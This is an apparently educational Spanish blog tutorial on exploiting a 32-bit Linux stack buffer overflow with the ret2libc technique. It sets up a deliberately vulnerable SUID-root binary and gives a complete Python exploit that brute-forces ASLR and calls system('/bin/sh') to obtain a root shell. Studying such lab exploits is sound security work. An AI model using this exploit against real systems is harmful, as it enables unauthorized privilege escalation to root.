---
title: "Linux Stack based BOF (x86) - Ret2libc"
date: 2024-01-05T15:16:01-03:00
categories: ["Fundamentos"]
tags: ["Buffer Overflow x86", "ret2libc", "Linux"]
---

En este post, estaremos llevando a cabo la explotación de un buffer overflow sobre un binario de 32 bits, aplicando la técnica Ret2libc.

> Antes de llevar a cabo la explotación del Buffer Overflow, es importante tener claro algunos conceptos. Para lo cual, te invito a leer antes el siguiente [post](https://d4redevilx.github.io/posts/pentesting/buffer-overflow) y luego retomar la lectura de este.
{: .prompt-tip }

## Programa vulnerable

Para demostrar la explotación de esta vulnerabilidad, utilizaremos el siguiente programa:

```c
#include <stdio.h>

void my_function(char *buff) {
	char buffer[64];
	strcpy(buffer, buff);
}

void main(int argc, char **argv) {
	my_function(argv[1]);
}
```

Compilamos el binario.

```bash
gcc -fno-stack-protector -m32 ovrflw.c -o ovrflw
```

Parámetros utilizados para la compilación:

- `-fno-stack-protector`: Deshabilita la protección del stack. Por defecto, algunos compiladores incluyen medidas de protección contra desbordamientos de pila, pero al especificar esta bandera, estás desactivando esas medidas de seguridad.
- `-m32`: Indica que se debe compilar para una arquitectura de 32 bits. Esto es importante si estás trabajando con un sistema operativo o una máquina que admite tanto arquitecturas de 32 bits como de 64 bits, y deseas específicamente compilar para la arquitectura de 32 bits.

- `-o` ovrflw: Indica que el programa compilado debe tener el nombre "ovrflw".

El funcionamiento del programa es simple. Toma el primer argumento que se pasa al ejecutarlo y lo envia a la fución `my_function`, la cual utiliza la función estandar `strcpy` para copiar su valor a una variable en la memoria llamada `buffer`.

> Es importante tener en cuenta, que la función `strcpy` es insegura tanto en el lenguaje C com C++.
{: .prompt-danger }

Lo que ocurre, es que la función `strcpy` no hace validación alguna sobre el tamaño de los buffers, lo cual puede llevar a un buffer overflow.

Para hacer un poco más interesante y ver los peligros que conlleva un buffer overflow, asignemos permiso SUID a nuestro binario y como propietario y grupo al usuario `root`.

```bash
chown root:root ovrflw
chmod u+s ovrflw
```

## Explotación del Buffer Overflow

### Fase inicial de Fuzzing y tomando el control del registro EIP

En primer lugar, ejecutemos el programa para comprobar que estamos frente a un buffer overflow.

![BOF-ovrflw](/assets/img/bof/BOF-ovrflw.png)

En la primera ejecución, observamos que el programa se ejecuta de forma normal. Lo que ha ocurrido es que en la variable `buffer` la cual tiene un tamaño de 64 bytes, está almacenando la letra que estamos pasando como argumento en este caso la letra **"A"**.

Por otra parte, en la segunda ejecución el programa se corrompe debido a que la función `strcpy` esta intentando copiar más datos de los reservados para el buffer que son 64 bytes.

Antes de continuar, obtengamos un poco más de información sobre el binario. Para ello podemos hacer uso de **gdb** con [gdb-peda](https://github.com/longld/peda).

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

Como podemos observar, el DEP (Data Execution Prevention) esta activado (NX). Lo cual indica que no podemos ejecutar código malicioso directamente en la pila (ESP). Pero esto no indica que no podamos explotar el binario. Podemos aprovecharnos de la técnia Ret2libc, usando las propias funciones de la biblioteca estandar `libc` las cuales se cargan en memoria junto con el binario.

### Explotación del binario usando Ret2Libc

Cuando pasamos las `A's` como argumento, lo que ocurre es que algunos de los registros están siendo sobrescritos:

- **ESP**: Apunta a la cima de la pila y se utiliza para añadir y quitar datos de la pila.
- **EBP**: Controla las funciones y procedimientos en la pila.
- **EIP**: Contiene la próxima dirección de memoria a la que seguirá el flujo del programa.

![BOF-ovrflw](/assets/img/bof/BOF-ESP-EBP.png)

Para visualizarlo con más detalle, podemos utilizar gdb que nos permite analizar el binario a bajo nivel observando como funciona el flujo del programa.

```bash
gdb ./ovrflw
r $(python3 -c 'print("A" * 100)')
```

![BOF-ovrflw](/assets/img/bof/gdb-peda-ovrflw.png)

Podemos observar, que los registros (ESP, EBP y EIP) están sobrescritos por nuestras **“A”**. El primer registro en el cual nos tenemos que centrar es en el EIP, el cual apunta a la dirección **0x41414141** que corresponde a nuestras `A's`.

### Determinar el offset

De las primeras cosas que debemos de averiguar para poder explotar el buffer overflow, es conocer el numero de bytes exactos para controlar el registro de EIP. Para ello podemos hacerlo de manera manual pero utilizando gdb-peda.

![BOF-ovrflw](/assets/img/bof/pattern-create.png)

El comando anterior, crea una cadena especialmente diseñada que corresponde a un patrón que luego **peda** podra utilizar para averiguar el offset, es decir, la cantidad exacta de bytes que debemos de enviar para poder controlar el EIP.

Corremos nuevamente el programa con `gdb`, pero en lugar de ingresar `A's` insertamos nuestro payload.

![BOF-ovrflw](/assets/img/bof/eip-overwrite.png)

La aplicación corrompe nuevamente y ahora el **EIP** vale `AA8A`.

Podemos contar de forma manual cuantos caracteres hay antes de `AA8A` en nuestro payload, lo cual determinará el offset o podemos hacer uso del comando `pattern offset` de `gdb`.

![BOF-ovrflw](/assets/img/bof/calculate-offset.png)

![BOF-ovrflw](/assets/img/bof/pattern-offset.png)

El offset, es decir, la cantidad de caracteres que debemos ingresar para que la aplicación falle son `112`. Podemos comprobar esto ingresando el siguiente payload.

```bash
elliot@Ubuntu:~/Desktop$ python3 -c "print('A' * 112 + 'B' * 4)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

![eip-overwrite-BBBB](/assets/img/bof/eip-overwrite-BBBB.png)

Observamos que el **EIP** ahora apunta a la dirección `0x42424242` que corresponde a nuestras `B's`. En otras palabaras, estamos sobreescribiendo el registro **EIP**.

### Ejecución del Buffer Overflow

Cuando el `ASLR` está habilitado y como se explicó anteriormente, al llevar a cabo un ataque Ret2Libc, es crucial aprovechar las funciones proporcionadas por la biblioteca `libc`. En este contexto, es necesario seleccionar una de las direcciones de la `base de libc`, las cuales se obtienen de la siguiente manera:

```bash
elliot@Ubuntu:~/Desktop$ for i in $(seq 1 1000); do ldd ovrflw | grep libc | awk 'NF{print $NF}' | grep "0xb7df0000" | tr -d '()'; done
```

![eip-overwrite-BBBB](/assets/img/bof/base_libc.png)

Como observamos, hemos identificado colisiones de direcciones en la memoria, lo que indica la presencia de repeticiones. El plan de ataque consiste en obtener los desplazamientos (`offsets`) de las funciones `system`, `exit` y `bin_sh`, para luego sumarles la dirección **base de libc** que hayamos seleccionado. De esta manera, podemos calcular las direcciones reales de `system`, `exit` y `bin_sh`. A continuación, veremos este proceso en acción para una mejor comprensión.

En consecuencia, será necesario emplear una técnica de "fuerza bruta", ejecutando repetidamente el programa. Este enfoque busca generar colisiones en la memoria, de manera que, en el momento en que el programa apunte a la base de la `libc` que hayamos seleccionado, podamos calcular los desplazamientos (`offsets`) y obtener las direcciones reales. De esta manera, logramos que el exploit sea exitoso al realizar una llamada al sistema para ejecutar `/bin/sh`.

Para obtener los offsets de `system`, `exit` y `bin_sh` podemos haderlo de la siguiente manera:

![eip-overwrite-BBBB](/assets/img/bof/system_exit.png)

> `readelf` constituye una utilidad de línea de comandos en sistemas Linux y Unix, empleada para examinar archivos ejecutables y objetos en formato ELF (Executable and Linkable Format). Los archivos ELF representan un formato habitual para programas y bibliotecas en sistemas operativos fundamentados en Unix, como es el caso de Linux.
{: .prompt-info }

Mediante la ejecución de este comando, logramos obtener el desplazamiento (`offset`) de las funciones `system` y `exit`.

Para adquirir el último desplazamiento (`offset`), será necesario ejecutar el siguiente comando:

![eip-overwrite-BBBB](/assets/img/bof/bin_sh.png)

Ahora que hemos obtenido todos los desplazamientos (`offsets`), podemos crear nuestro exploit.

### Exploit

```python
#!/usr/bin/env python3

# 1. Calcular offset
# 2. Obtener una base de libc
# 3. Obtener offsets (system, exit, bin_sh)
# 4. Calcular direcciones reales
# EIP = system_address + exit_address + bin_sh_address

import sys
from struct import pack
from subprocess import call

# ldd ovrflw
# for i in $(seq 1 1000); do ldd ovrflw | grep libc | awk 'NF{print $NF}' | grep "0xb7df0000" | tr -d '()'; done

base_libc_address = 0xb7df0000

# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "\bsystem@@| exit@@"
system_address_offset = 0x0002e9e0
exit_address_offset = 0x0003adb0

# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
bin_sh_address_offset = 0x0015bb2b

# calculamos las direcciones reales
system_address = pack("<L", system_address_offset + base_libc_address)
exit_address = pack("<L", exit_address_offset + base_libc_address)
bin_sh_address = pack("<L", bin_sh_address_offset + base_libc_address)

offset = 112
junk = b"A" * 112

eip = system_address + exit_address + bin_sh_address

payload = junk + eip

while True:
    res = call(["/home/elliot/Desktop/ovrflw", payload])
    if res == 0:
        print("\n[!] Exiting the program...\n")
        sys.exit(0)
```

Utilizando la librería `subprocess` y su función `call`, podemos ejecutar el binario objetivo desde el propio exploit, proporcionando el payload como argumento. Esto nos permite llevar a cabo el ataque, y el resultado obtenido sería el siguiente.

```bash
elliot@Ubuntu:~/Desktop$ python3 exploit.py
# whoami
root
#
```

Finalmente hemos logrado poder realizar una llamada a nivel de sistema ejecutandonos una **/bin/sh** como el usuario **root**, ya que el binario tenia permisos SUID.

### Conclusiones

Para finalizar, a modo de conclusión podemos decir que aunque un ejecutable cuente con protecciones, es factible eludir esas restricciones, como hemos observado. Aunque el ASLR constituye una medida de seguridad sólida, es evidente que existen técnicas capaces de sortear dicha protección.

Por ultimo, es recomendado prevenir el uso de funciones inseguras como `strcpy` y, en su lugar, sustituirla con la función `strncpy`, incorporándola al código de la siguiente manera:

```c
#include <stdio.h>

void my_function(char *buff) {
	char buffer[64];
	strncpy(buffer, buff, sizeof(buffer));
}

void main(int argc, char **argv) {
	my_function(argv[1]);
}
```

De esta forma, llegamos al final del post.

Espero que los conceptos hayan quedado claros. Si has llegado hasta este punto y aún tienes dudas, te recomiendo volver a leer y poner en practica los conceptos.

Gracias por tu lectura!

Happy Hacking!
